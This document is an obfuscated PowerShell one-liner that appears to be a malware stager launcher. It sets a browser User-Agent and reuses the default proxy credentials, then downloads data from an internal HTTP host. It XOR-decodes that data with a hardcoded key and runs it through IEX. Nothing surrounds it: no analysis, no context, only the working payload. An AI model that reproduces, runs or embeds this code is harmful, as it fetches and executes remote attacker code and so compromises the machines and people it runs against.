
[SYsTem.NEt.SErvIcEPoIntManagEr]::ExpECT100COnTinue = 0;$Wc=New-OBJeCT SYSteM.Net.WeBCLieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEADErs.Add('User-Agent',$u);$wC.PRoXy = [SYstEm.NEt.WebREquesT]::DEFAUlTWeBPrOXy;$wC.PRoxY.CREdEnTIAls = [SySTEM.Net.CrEdeNtIALCAChe]::DeFauLtNETwORkCredENtiALs;$K='2b21d9d8f81c6e564c84ef0bfa94aa5c';$i=0;[cHaR[]]$B=([cHaR[]]($wc.DOWNlOadStrINg("http://172.16.0.147:8080/index.asp")))|%{$_-bXOR$K[$i++%$k.LEngTH]};IEX ($B-join'')

